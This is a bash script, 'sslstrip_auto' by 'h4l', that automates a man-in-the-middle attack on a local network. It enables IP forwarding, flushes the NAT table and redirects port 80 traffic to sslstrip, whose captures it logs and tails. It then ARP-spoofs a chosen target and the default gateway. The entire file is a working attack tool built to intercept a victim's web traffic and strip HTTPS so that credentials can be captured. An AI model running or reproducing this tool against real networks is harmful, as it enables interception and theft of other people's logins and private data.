#!/bin/bash

#This script must be run with root permissions.

#CONFIG
listen_port=8080
verbose=
target=
interface=
#ERROR HANDLER
function error_exit
{
	echo "$1" 1>&2
	exit 1
}

#USAGE
function usage
{
cat << EOF
sslstrip_auto script 0.1 by h4l

Usage: sslstrip_auto.sh <options>

Options:
	-v				Run in verbose mode
	-t <addr>		Target IP address for ARP spoof (ipv4)
	-i <name>		Interface name (ex. "wlan0")
	-p <port>		Configure to listen on/forward to port (Default: 666)
	-h				Print this help file

WARNING: This script will overwrite any NAT table rules you have configured in iptables.

EOF
}

#GET COMMAND LINE ARGUMENTS
OPTIND=1
while getopts "vh:p:t:i:" flag; do
	case $flag in
        p)
		listen_port=$OPTARG
        	if [[ $verbose == "1" ]]
			then echo "LISTEN_PORT SET TO:" $listen_port
		fi
		;;
	t)
		target=$OPTARG
		if [[ $verbose == "1" ]]
			then echo "TARGET SET TO:" $target
		fi
		;;
	i)
		interface=$OPTARG
		if [[ $verbose == "1" ]]
			then echo "USING INTERFACE" $interface
		fi
		;;
	v)
        	verbose=1
        	;;
     	h)
		usage
       		exit
        	;;
        *)
		usage
        	exit 1
	esac
done

#ENABLE PACKET FORWARDING
forwarding=$(cat /proc/sys/net/ipv4/ip_forward)
if [ "$forwarding" == "0" ]
  then
	echo -e "/net/ipv4/ip_forward is turned off. Enabling.\n"
	echo 1 > /proc/sys/net/ipv4/ip_forward || error_exit "Not able to set ipv4 forwarding to status 1. Check permissions."
	echo -e "IPV4 forwarding enabled successfully.\n"
fi
	echo -e "IPV4 forwarding already enabled.\n"

#CONFIG IPTABLES TO FORWARD PACKETS TO $listen_port
echo "Writing out new config to IPTABLES. Forwarding port 80 to" $listen_port
iptables -t nat -F || error_exit "Cannot access iptables. Check permissions."
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $listen_port || error_exit "Can read but not modify iptables. Check permissions."
if [[ $verbose == "1" ]]
	then iptables -t nat -L
fi

#START SSLSTRIP AND TAIL LOG
echo -e "Starting new terminals for sslstrip and a log tail."
x-terminal-emulator -e sslstrip -f -l $listen_port -w ~/sslstrip.log
sleep 3
x-terminal-emulator -e tail -f ~/sslstrip.log


#ANALYZE NETWORK AND ARPSPOOF
localhost=$(ifconfig $interface | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}')
default_gateway=$(route | grep 'default' | cut -d ' ' -f10)
if [[ $verbose = "1" ]]
	then
		echo -e "Analyzed network interface.\nLocalhost is:" $localhost
		echo -e "\nRouter to spoof is:" $default_gateway
fi
echo -e "Running arpspoof in new xterm window. Control-C to stop it."
x-terminal-emulator -e arpspoof -i $interface -t $target $default_gateway


